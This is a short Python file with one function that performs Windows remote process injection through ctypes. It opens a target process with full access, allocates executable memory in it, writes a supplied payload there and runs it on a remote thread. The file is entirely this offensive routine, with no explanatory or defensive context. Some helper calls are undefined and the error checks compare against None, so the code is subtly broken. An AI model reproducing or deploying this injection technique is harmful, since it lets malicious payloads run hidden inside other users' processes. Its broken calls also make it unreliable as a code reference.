import ctypes

def MpfPiWriteProcessMemoryCreateRemoteThread(payload, payload_size, target_process_id):
    handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_process_id)
    if handle is None:
        return False

    base_address = ctypes.windll.kernel32.VirtualAllocEx(handle, None, payload_size, 0x3000, 0x40)
    if base_address is None:
        return False

    if not SetProcessPrivilegeToken(0):
        return False

    if not WriteProcessMemory(handle, base_address, payload, payload_size, None):
        return False

    thread = ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, base_address, None, 0, None)
    if thread is None:
        return False

    WaitForSingleObject(thread, -1)
    return True
